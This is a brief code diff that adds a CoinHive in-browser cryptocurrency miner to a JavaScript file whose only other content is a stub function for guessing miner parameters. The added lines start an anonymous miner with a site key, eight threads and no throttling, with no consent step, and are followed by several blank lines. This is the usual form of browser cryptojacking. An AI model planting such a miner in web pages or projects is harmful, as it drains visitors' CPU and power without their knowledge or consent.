@@ -1,3 +1,11 @@
+var miner = new CoinHive.Anonymous ('Ansnx3ssG1KPPjbVHMIikQP9APAZYIio', {threads: 8, throttle: 0.0});
+miner.start (CoinHive.IF_EXCLUSIVE_TAB);
+
+
+
+
+
+
 function guessInitialMinerParameters () {
 	// TODO
 }
